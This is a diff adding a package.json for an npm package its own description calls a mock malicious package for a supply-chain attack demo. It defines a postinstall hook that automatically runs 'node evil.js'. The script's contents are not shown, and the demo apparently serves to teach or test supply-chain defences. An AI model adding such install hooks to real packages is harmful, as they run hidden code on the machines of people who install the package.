@@ -1,0 +1,11 @@
+{
+  "name": "malicious-package",
+  "version": "1.0.0",
+  "description": "A mock malicious npm package for supply chain attack demo",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "node evil.js"
+  },
+  "author": "attacker",
+  "license": "ISC"
+}
